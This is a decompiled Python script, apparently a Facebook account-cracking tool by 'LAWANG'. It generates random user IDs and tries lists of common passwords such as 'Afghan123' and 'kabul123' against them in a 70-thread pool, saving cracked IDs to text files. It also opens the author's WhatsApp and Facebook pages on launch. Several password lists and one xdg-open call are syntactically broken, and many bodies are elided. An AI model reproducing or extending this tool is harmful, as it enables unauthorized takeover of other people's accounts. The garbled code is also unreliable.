# Decompile by Mardis (Tools By LAWANG)
# Time Succes decompile : 2023-02-07 00:26:14.084668
from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open http://wa.me/+93781617856')
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://www.facebook.com/profile.php?id=100000962271792&mibextid=ZbWKwL ')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
logo=("""
  ...
  ─────────────────────────────────────────────────
  WELCOME TO Lawang TOOLS 🔥✅
  ─────────────────────────────────────────────────    
\33[1;37m----------------------------------------------
→   Owner      :    LAWANG
→  Facebook :    Mula lawang
→Whatsapp:     0781617856
→   Tools       :   RANDOM 
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+93781617855text=SAKOON💜Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-open'https://www.facebook.com/profile.php?id=100000962271792&mibextid=ZbWKwL);riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    print(46*'-')
    print('IDZ SAVED IN Lawang.txt : Lawang..txt')
    print(46*'-')
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','۱۲۳۴۵۶'khan123'afghan123'50006000'600700'Afghanistan]
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN Lawang.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Ahmad123','khan123','jan123','50006000','600700','Afghanistan]
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN Lawang.txt : CP.txt')
    print(46*'-')
